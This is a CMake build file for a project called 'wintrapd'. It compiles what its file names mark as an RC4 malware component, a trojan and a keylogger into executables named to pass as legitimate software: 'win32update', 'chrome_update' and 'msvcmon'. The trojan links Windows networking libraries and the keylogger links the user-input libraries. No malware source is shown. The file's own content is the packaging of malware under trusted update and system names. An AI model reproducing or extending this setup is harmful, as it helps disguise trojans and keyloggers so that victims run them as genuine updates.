cmake_minimum_required(VERSION 3.10)

project(wintrapd)

set(CMAKE_C_STANDARD 11)

# win32update
add_executable(win32update malwr_rc4.c)
set_target_properties(win32update PROPERTIES OUTPUT_NAME "win32update")

# b64tool
add_executable(b64tool b64tool.c)
target_link_libraries(b64tool crypt32)
set_target_properties(b64tool PROPERTIES OUTPUT_NAME "b64tool")

# chrome_update
add_executable(chrome_update trojan.c chrome_update.rc)
target_link_libraries(chrome_update wininet shell32)
set_target_properties(chrome_update PROPERTIES OUTPUT_NAME "chrome_update")

# msvcmon
add_executable(msvcmon kylg_winapi.c)
target_link_libraries(msvcmon user32 gdi32 kernel32)
set_target_properties(msvcmon PROPERTIES OUTPUT_NAME "msvcmon")
